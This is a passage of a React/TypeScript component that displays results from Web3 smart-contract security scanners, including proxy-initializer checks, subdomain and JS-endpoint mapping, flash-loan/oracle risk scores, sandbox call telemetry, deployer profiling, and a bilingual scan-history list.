            <div key={idx} className="rounded-lg border border-border bg-background p-3.5 space-y-2">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <span className="font-bold text-foreground">
                  [{tc.target?.toUpperCase()}] {tc.addr}
                </span>
                <div className="flex gap-2 text-[10px]">
                  <span className="rounded border border-border bg-card px-2 py-0.5">
                    upgradeSelector: <b>{tc.has_upgrade ? "YES" : "NO"}</b>
                  </span>
                  <span className="rounded border border-border bg-card px-2 py-0.5">
                    _disableInitializers: <b>{tc.has_disable ? "YES" : "NO"}</b>
                  </span>
                </div>
              </div>
              {Array.isArray(tc.inits) && tc.inits.length > 0 ? (
                <div className="space-y-1.5 pt-1">
                  {tc.inits.map((ini: any, ii: number) => (
                    <div
                      key={ii}
                      className={`flex flex-wrap items-center justify-between gap-2 rounded border px-2.5 py-1.5 text-[11px] ${
                        ini.vulnerable
                          ? "border-red-500/50 bg-red-500/10 text-red-400"
                          : "border-border bg-card text-muted-foreground"
                      }`}
                    >
                      <code className="font-bold text-foreground">{ini.sig} (0x{ini.selector})</code>
                      <span>{ini.reason}</span>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-[11px] text-muted-foreground">
                  {isRu
                    ? "Открытых функций initialize() без аргументов в байткоде/ABI не обнаружено."
                    : "No exposed argumentless initialize() selectors detected."}
                </p>
              )}
            </div>
          ))}
        </div>
      )}

      {/* 11. Web3 Off-Chain Surface Mapper */}
      {result && tool === "surface" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div>
              <span className="text-primary font-bold">{result.domain}</span>
              <span className="ml-2 text-muted-foreground">({result.scanned_url})</span>
            </div>
            <span className="rounded border border-primary/40 bg-primary/15 px-2.5 py-0.5 text-[11px] font-bold text-primary">
              Alive Subdomains: {result.subdomains_count || 0}
            </span>
          </div>

          {/* Subdomains */}
          {Array.isArray(result.subdomains_alive) && result.subdomains_alive.length > 0 && (
            <div className="rounded-lg border border-border bg-background p-3.5">
              <p className="mb-2 text-[10px] uppercase tracking-wider text-primary font-bold">
                {isRu ? "Обнаруженные поддомены инфраструктуры" : "Discovered Infrastructure Subdomains"}
              </p>
              <div className="grid grid-cols-1 gap-2 sm:grid-cols-2 lg:grid-cols-3">
                {result.subdomains_alive.map((s: any, i: number) => (
                  <a
                    key={i}
                    href={s.url}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex items-center justify-between rounded border border-border bg-card px-3 py-2 hover:border-primary"
                  >
                    <span className="font-bold text-foreground truncate">{s.host}</span>
                    <span className="text-[10px] text-muted-foreground">
                      HTTP {s.status || "DNS"} ({fmt(s.body_len, 0)}B)
                    </span>
                  </a>
                ))}
              </div>
            </div>
          )}

          {/* Frontend JS Artifacts */}
          {result.frontend && (
            <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
              <div className="rounded-lg border border-border bg-background p-3.5">
                <p className="mb-1.5 text-[10px] uppercase text-primary font-bold">
                  {isRu
                    ? `Контракты в JS-бандлах (${(result.frontend.contracts || []).length})`
                    : `Contracts in JS Bundles (${(result.frontend.contracts || []).length})`}
                </p>
                {(result.frontend.contracts || []).length === 0 ? (
                  <p className="text-[11px] text-muted-foreground">—</p>
                ) : (
                  <div className="max-h-40 overflow-y-auto space-y-1">
                    {(result.frontend.contracts || []).map((c: string, idx: number) => (
                      <div key={idx} className="truncate text-[11px] text-foreground select-all">
                        {c}
                      </div>
                    ))}
                  </div>
                )}
              </div>

              <div className="rounded-lg border border-border bg-background p-3.5">
                <p className="mb-1.5 text-[10px] uppercase text-primary font-bold">
                  RPC / API / GraphQL / WebSockets
                </p>
                <div className="max-h-40 overflow-y-auto space-y-1 text-[11px]">
                  {[
                    ...(result.frontend.api || []),
                    ...(result.frontend.rpc || []),
                    ...(result.frontend.graphql || []),
                    ...(result.frontend.ws || []),
                  ].slice(0, 20).map((u: string, idx: number) => (
                    <div key={idx} className="truncate text-muted-foreground select-all">
                      {u}
                    </div>
                  ))}
                  {(result.frontend.sourcemaps || []).length > 0 && (
                    <div className="pt-1 text-amber-400">
                      ⚠️ SourceMaps exposed: {(result.frontend.sourcemaps || []).length}
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {/* 12. Flash-Loan & Spot-Oracle + Bridge Signature Detector */}
      {result && tool === "flash" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div>
              <span className="text-primary font-bold">{result.address}</span>
              <span className="ml-2 text-muted-foreground">({result.chain})</span>
            </div>
            <span className="rounded border border-primary/40 bg-primary/15 px-2.5 py-0.5 text-[11px] font-bold text-primary">
              {result.verdict} · Score: {result.composite_score}
            </span>
          </div>

          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">SPOT Oracle Score</p>
              <p className="mt-1 text-sm font-bold text-red-400">{result.spot_oracle?.spot_score ?? 0}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">TWAP / Chainlink Defense</p>
              <p className="mt-1 text-sm font-bold text-green-400">{result.spot_oracle?.protection_score ?? 0}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">FlashLoan Callbacks</p>
              <p className="mt-1 text-sm font-bold text-amber-400">{result.spot_oracle?.flash_score ?? 0}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Monetizers (Borrow/Liq)</p>
              <p className="mt-1 text-sm font-bold text-primary">{result.spot_oracle?.monetizer_score ?? 0}</p>
            </div>
          </div>

          <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
            <div className="rounded-lg border border-border bg-background p-3.5 space-y-2">
              <p className="text-[10px] uppercase text-primary font-bold">
                {isRu ? "Признаки SPOT-цены и монетизации" : "Detected SPOT Reads & Monetizers"}
              </p>
              {[...(result.spot_oracle?.spot || []), ...(result.spot_oracle?.flash || []), ...(result.spot_oracle?.monetizers || [])].length === 0 ? (
                <p className="text-[11px] text-muted-foreground">—</p>
              ) : (
                <div className="space-y-1">
                  {[...(result.spot_oracle?.spot || []), ...(result.spot_oracle?.flash || []), ...(result.spot_oracle?.monetizers || [])].map((s: any, idx: number) => (
                    <div key={idx} className="flex items-center justify-between rounded border border-border bg-card px-2.5 py-1 text-[11px]">
                      <span className="text-foreground">{s.name}</span>
                      <span className="text-primary font-bold">×{s.hits}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div className="rounded-lg border border-border bg-background p-3.5 space-y-2">
              <p className="text-[10px] uppercase text-primary font-bold">
                {isRu ? "Защитные оракулы и байткод-сигнатуры мостов" : "Oracle Defenses & Bridge Bytecode Signatures"}
              </p>
              {(result.spot_oracle?.protection || []).map((p: any, idx: number) => (
                <div key={idx} className="flex items-center justify-between rounded border border-green-500/30 bg-green-500/10 px-2.5 py-1 text-[11px] text-green-400">
                  <span>🛡️ {p.name}</span>
                  <b>×{p.hits}</b>
                </div>
              ))}
              {result.bytecode_signatures && Object.keys(result.bytecode_signatures).length > 0 && (
                <div className="pt-1 flex flex-wrap gap-1.5">
                  {Object.entries(result.bytecode_signatures).map(([cat, sels]: [string, any]) => (
                    <span key={cat} className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary">
                      {cat}: {Array.isArray(sels) ? sels.length : 1}
                    </span>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* 13. Matrix Sandbox v16.2 (Isolated Process + AuditHook + Honeypot) */}
      {result && tool === "sandbox" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div className="flex items-center gap-2">
              <span className="font-bold text-foreground">
                Matrix Sandbox v16.2 ({result.status || "PASS"})
              </span>
              <span className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary">
                ENGINE: {result.engine || "matrix_sandbox_v16_2"}
              </span>
            </div>
            <span
              className={`rounded border px-2.5 py-0.5 text-[11px] font-bold ${
                String(result.verdict).startsWith("CRITICAL") || String(result.verdict).startsWith("HIGH")
                  ? "border-red-500/50 bg-red-500/15 text-red-400"
                  : "border-green-500/50 bg-green-500/15 text-green-400"
              }`}
            >
              {result.verdict}
            </span>
          </div>

          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Blocked Hostile Ops</p>
              <p className="mt-1 text-sm font-bold text-red-400">{result.blocked_count ?? 0}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Honeypot Simulated</p>
              <p className="mt-1 text-sm font-bold text-amber-400">{result.simulated_count ?? result.intercepted_count ?? 0}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3 col-span-2">
              <p className="text-[10px] uppercase text-muted-foreground">Intercepted Subsystems</p>
              <p className="mt-1 truncate font-bold text-primary">
                {(result.dangerous_mocked || []).join(", ") || "None"}
              </p>
            </div>
          </div>

          <div className="rounded-lg border border-border bg-background p-3.5 space-y-2">
            <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
              {isRu
                ? `Телеметрия перехваченных вызовов Matrix v16.2 (${result.intercepted_count || 0}):`
                : `Matrix v16.2 Intercepted Call Telemetry (${result.intercepted_count || 0}):`}
            </p>
            {(result.intercepted_calls || []).length === 0 ? (
              <p className="text-[11px] text-muted-foreground">
                {isRu ? "Опасных вызовов не зафиксировано." : "No dangerous calls intercepted."}
              </p>
            ) : (
              <div className="space-y-1.5 max-h-60 overflow-y-auto">
                {(result.intercepted_calls || []).map((ic: any, idx: number) => (
                  <div key={idx} className="flex flex-wrap items-center justify-between gap-2 rounded border border-red-500/30 bg-red-500/5 px-3 py-1.5 text-[11px]">
                    <div className="flex items-center gap-2">
                      <span
                        className={`rounded px-1.5 py-0.5 text-[9px] font-bold uppercase ${
                          ic.classification === "BLOCKED"
                            ? "bg-red-500/25 text-red-300"
                            : "bg-amber-500/20 text-amber-300"
                        }`}
                      >
                        {ic.classification || "SIMULATED"}
                      </span>
                      <span className="font-bold text-red-400">
                        {ic.call}
                      </span>
                    </div>
                    <code className="text-foreground break-all">
                      {Array.isArray(ic.args) ? ic.args.join(" · ") : JSON.stringify(ic.args)}
                    </code>
                  </div>
                ))}
              </div>
            )}
          </div>

          {(result.stdout || result.stderr) && (
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground mb-1">Sandbox Output (stdout / stderr)</p>
              <pre className="whitespace-pre-wrap text-[11px] text-foreground">
                {result.stdout}
                {result.stderr ? `\n[stderr] ${result.stderr}` : ""}
              </pre>
            </div>
          )}
        </div>
      )}

      {/* 14. Deployer & On-Chain Address Profiler (address_profiler.py + deploy_analyzer.py) */}
      {result && tool === "deployer" && result.primary && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div className="flex flex-wrap items-center gap-2">
              <span className="rounded border border-primary/40 bg-primary/15 px-2 py-0.5 text-[10px] font-bold uppercase text-primary">
                {result.primary.type || "ADDRESS"}
              </span>
              <span className="text-primary font-bold">{result.primary.address}</span>
              <span className="text-muted-foreground">({String(result.primary.chain || "").toUpperCase()})</span>
            </div>
            <span className="rounded border border-border bg-background px-2.5 py-0.5 text-[11px] font-bold text-foreground">
              Risk: {result.primary.risk_level || "LOW"}
            </span>
          </div>

          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Contract / Entity Name</p>
              <p className="mt-1 truncate font-bold text-foreground">
                {result.primary.known_label || result.primary.contract_name || "Unlabeled"}
              </p>
              <p className="mt-0.5 text-[10px] text-muted-foreground">
                {result.primary.category || "general"} · {result.primary.pattern || "standard"}
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Age & Verification</p>
              <p className="mt-1 font-bold text-foreground">
                {result.primary.age_days !== null && result.primary.age_days !== undefined
                  ? `${result.primary.age_days} days`
                  : "—"}
              </p>
              <p className="mt-0.5 text-[10px] text-muted-foreground">
                Verified: {result.primary.verified ? "✅ YES" : "❌ NO"}
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Native Balance / Txs</p>
              <p className="mt-1 font-bold text-foreground">
                {Number(result.primary.balance_native || 0).toFixed(4)} ETH/Native
              </p>
              <p className="mt-0.5 text-[10px] text-muted-foreground">
                Tx Count: {result.primary.tx_count ?? 0}
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Proxy / Implementation</p>
              <p className="mt-1 truncate font-bold text-primary">
                {result.primary.is_proxy ? (result.primary.implementation || "Proxy") : "Standalone"}
              </p>
              <p className="mt-0.5 text-[10px] text-muted-foreground">
                Created: {result.primary.creation_time ? String(result.primary.creation_time).slice(0, 10) : "—"}
              </p>
            </div>
          </div>

          {/* Creator / Deployer Wallet Intelligence */}
          {result.primary.creator && (
            <div className="rounded-lg border border-primary/30 bg-background p-4 space-y-2">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                  👤 {isRu ? "Досье кошелька Деплоера (Creator EOA / Multisig):" : "Deployer Wallet Intelligence (Creator):"}
                </span>
                {result.primary.creation_tx && (
                  <span className="truncate text-[10px] text-muted-foreground">
                    Deploy Tx: {result.primary.creation_tx.slice(0, 18)}…
                  </span>
                )}
              </div>
              <div className="flex flex-wrap items-center justify-between gap-3">
                <code className="font-bold text-foreground select-all">{result.primary.creator}</code>
                {result.primary.creator_profile && (
                  <div className="flex flex-wrap gap-3 text-[11px] text-muted-foreground">
                    <span>
                      Type: <b className="text-foreground">{String(result.primary.creator_profile.type).toUpperCase()}</b>
                    </span>
                    <span>
                      Balance: <b className="text-foreground">{Number(result.primary.creator_profile.balance_native || 0).toFixed(4)}</b>
                    </span>
                    <span>
                      Txs: <b className="text-foreground">{result.primary.creator_profile.tx_count ?? 0}</b>
                    </span>
                    {result.primary.creator_profile.age_days !== null && (
                      <span>
                        Age: <b className="text-foreground">{result.primary.creator_profile.age_days}d</b>
                      </span>
                    )}
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Security Notes & Exposed ABI Functions */}
          {Array.isArray(result.primary.security_notes) && result.primary.security_notes.length > 0 && (
            <div className="rounded-lg border border-border bg-background p-3.5 space-y-1">
              <p className="text-[10px] uppercase text-primary font-bold">Security Observations</p>
              {result.primary.security_notes.map((sn: string, idx: number) => (
                <p key={idx} className="text-[11px] text-foreground">• {sn}</p>
              ))}
            </div>
          )}

          {Array.isArray(result.primary.abi_functions) && result.primary.abi_functions.length > 0 && (
            <div className="rounded-lg border border-border bg-background p-3.5">
              <p className="mb-2 text-[10px] uppercase text-muted-foreground font-bold">
                Exposed ABI Functions ({result.primary.abi_functions.length})
              </p>
              <div className="flex flex-wrap gap-1.5 max-h-36 overflow-y-auto">
                {result.primary.abi_functions.slice(0, 40).map((fn: string, idx: number) => (
                  <code key={idx} className="rounded border border-border bg-card px-2 py-0.5 text-[10px] text-foreground">
                    {fn}
                  </code>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

      {/* TOOL RUN HISTORY (Holders & Whales, Market & Derivatives, Funds Flow 14d, Social, Soroban, OSPEC) */}
      <div className="rounded-xl border border-border bg-card p-5">
        <div className="mb-4 flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-center gap-2">
            <History size={15} className="text-primary" />
            <h4 className="font-mono text-xs font-bold uppercase tracking-wider text-foreground">
              {isRu
                ? "История сканов по инструментам (Holders · Market · Funds Flow · Social · Soroban · OSPEC)"
                : "Intelligence Tool Scan History (Holders · Market · Funds Flow · Social · Soroban · OSPEC)"}
            </h4>
          </div>
          <div className="flex flex-wrap gap-1.5">
            {[
              { id: "all", label: isRu ? "Все" : "All" },
              { id: "holders", label: "Holders" },
              { id: "market", label: "Market" },
              { id: "funds", label: "Funds Flow" },
              { id: "social", label: "Social" },
              { id: "soroban", label: "Soroban" },
              { id: "ospec", label: "OSPEC" },
              { id: "hacks", label: "2,539 Exploits DB" },
              { id: "deployer", label: "Deployer" },
              { id: "proxy", label: "Proxy" },
              { id: "flash", label: "Flash/Spot" },
              { id: "surface", label: "Surface" },
              { id: "sandbox", label: "Sandbox v16.2" },
            ].map((f) => (
              <button
                key={f.id}
                onClick={() => setHistoryFilter(f.id)}
                className={`rounded-lg px-2.5 py-1 font-mono text-[10px] font-semibold transition-all ${
                  historyFilter === f.id
                    ? "bg-primary text-primary-foreground"
                    : "border border-border bg-background text-muted-foreground hover:text-foreground"
                }`}
              >
                {f.label}
              </button>
            ))}
          </div>
        </div>

        {historyItems.length === 0 ? (
          <p className="font-mono text-xs text-muted-foreground">
            {isRu
              ? "История запусков инструментов пока пуста. Любой прогон по Holders, Market, Funds Flow, Social, Soroban или OSPEC автоматически сохраняется здесь."
              : "No tool runs recorded yet. Every Holders, Market, Funds Flow, Social, Soroban or OSPEC scan is saved here automatically."}
          </p>
        ) : (
          <div className="space-y-2">
            {historyItems.map((item) => (
              <div
                key={item.id}
                className="flex flex-wrap items-center justify-between gap-3 rounded-lg border border-border bg-background px-3.5 py-2.5 font-mono text-xs"
              >
                <div className="min-w-0 flex-1">
                  <div className="flex items-center gap-2">
                    <span className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold uppercase text-primary">
                      {item.tool}
                    </span>
                    <span className="truncate font-bold text-foreground">{item.target}</span>
                    {item.chain && (
                      <span className="text-[10px] uppercase text-muted-foreground">[{item.chain}]</span>
                    )}
                  </div>
                  <p className="mt-1 truncate text-[11px] text-muted-foreground">
                    {item.summary} · {new Date(item.created_at * 1000).toLocaleString()}
                  </p>
                </div>
                <button
                  onClick={() => handleOpenHistoryItem(item)}
                  disabled={loadingHistoryId === item.id}
                  className="inline-flex items-center gap-1.5 rounded-lg border border-border bg-card px-3 py-1.5 text-[11px] font-semibold text-foreground transition-colors hover:border-primary hover:text-primary disabled:opacity-50"
                >
                  <Eye size={12} />
                  <span>
                    {loadingHistoryId === item.id
                      ? isRu ? "Загрузка…" : "Loading…"
                      : isRu ? "Открыть" : "Open"}
                  </span>
                </button>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

export default ToolsPanel;
